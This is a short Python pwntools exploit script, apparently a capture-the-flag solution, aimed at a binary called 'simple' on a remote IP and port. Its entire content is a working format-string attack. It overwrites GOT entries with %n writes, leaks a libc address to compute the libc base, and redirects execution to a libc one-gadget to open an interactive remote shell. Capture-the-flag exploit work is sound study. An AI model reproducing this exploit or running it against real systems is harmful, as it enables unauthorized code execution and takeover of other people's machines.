from pwn import *
context.log_level='debug'
main=0x4006a6
got=0x000000000601040
#p=process("./simple")
p=remote("51.254.114.246",4444)
payload="%{}c%12$n|%p(%p)".format(main)
payload=payload.ljust(0x30,'\x00')
payload+=p64(got)

p.sendline(payload)
p.readuntil("(")
base=int(p.readuntil(")")[:-1],16)-(0x7ffff7b04260-0x00007ffff7a0d000)
log.warning(hex(base))

res=base+0x4526a
p1=res&0xffff
p2=res&0xff0000
p2=p2>>16

payload="%{}c%12$hn".format(p1)
payload=payload.ljust(0x30,'\x00')
payload+=p64(0x000000000601030)
p.sendline(payload)



payload="%{}c%12$hhn".format(p2)
payload=payload.ljust(0x30,'\x00')
payload+=p64(0x000000000601032)
p.sendline(payload)


payload="%{}c%12$ln".format(0x000000000400570)
payload=payload.ljust(0x30,'\x00')
payload+=p64(got)
#gdb.attach(p)
p.sendline(payload)

p.interactive()
#
